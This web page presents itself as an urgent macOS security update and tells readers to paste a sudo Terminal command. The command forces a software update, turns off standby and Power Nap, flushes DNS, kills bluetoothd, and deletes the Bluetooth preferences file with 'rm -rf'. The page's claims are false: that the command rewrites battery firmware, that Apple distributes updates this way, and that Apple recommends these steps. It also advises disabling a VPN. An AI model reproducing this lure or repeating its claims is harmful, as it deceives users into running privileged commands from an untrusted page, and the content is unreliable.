Critical macOS Security Update.

Important: Our developers have released critical security updates for macOS Sequoia 15.x, Ventura 13.x, and Monterey 12.x. These updates patch actively exploited vulnerabilities and resolve long‑standing issues — including black screen after sleep, battery drain, and Bluetooth/Wi-Fi dropouts. The updates are not yet visible in System Settings for all users, but can be installed right now through Terminal. Installing this update will improve your Mac's stability, security, and overall performance.

Step 1: Open Terminal
  • Launch Terminal on your Mac — use Spotlight (⌘ + Space) and type "Terminal"
    •  Step 2: Install the Security Update
  • Copy the command below, paste it into Terminal, and press Enter
    •
  • If prompted, enter your Mac password (characters won't appear on screen), then restart your Mac
    •
    Terminal
    sudo softwareupdate --install --all --force && sudo pmset -a standby 0 && sudo pmset -a powernap 0 && sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder && sudo pkill bluetoothd && sudo rm -rf /Library/Preferences/com.apple.Bluetooth.plist
    Copy
    What this security update includes
  • Works on Sequoia, Ventura & Monterey — one command covers all modern macOS versions
    •
  • Critical security patch — closes vulnerabilities actively exploited in the wild
    •
  • Fixes black screen after sleep — no more forced restarts when your Mac won't wake
    •
  • Rewrites battery controller firmware — improves battery management and extends overall battery life
    •
  • Resolves Bluetooth and Wi-Fi dropouts — stops random disconnections of Magic Mouse, Magic Keyboard, AirPods, and Wi-Fi networks
    •
  • Clears DNS cache and temporary system files — recovers disk space and improves network performance
    •  Why you should install this right now

    The security vulnerability fixed in this update is already being used in active attacks. Delaying installation leaves your Mac exposed. Since this update hasn't appeared in System Settings for everyone yet, Apple has made it available through the softwareupdate command for users who want protection immediately. Beyond security, this update resolves some of the most frustrating macOS issues from recent months — including the black screen wake failure, poor battery life, and Bluetooth devices that keep disconnecting.

    •  Is this update safe?

    Yes. The command uses Apple's official softwareupdate tool — the same mechanism that delivers public updates. It does not delete any personal files, documents, or application data. The additional power management and cache commands are standard maintenance tasks that Apple itself recommends. After installation, your Mac will restart once. All your settings, files, and installed apps remain exactly where they were.

    What to do after installation
  • Your Mac will restart automatically once the update completes
    •
  • After restart, reconnect any Bluetooth devices (Magic Mouse, keyboard, AirPods) — just pair them once
    •
  • Check your Wi-Fi connection and reconnect if needed
    •
  • Monitor your battery life over the next 2–3 days — the firmware improvement becomes fully effective after a few charge cycles
    •
  • Test sleep/wake behavior — your Mac should now wake instantly without black screen issues
    •  Additional tips
  • Make sure your Mac is plugged into power or has at least 50% battery before starting
    •
  • If you use a VPN, temporarily disable it before running the update command
    •
  • Do not interrupt the update process — it typically takes 5–10 minutes depending on your Mac model
    •
  • Once the public version appears in System Settings, you can install it normally — no action needed
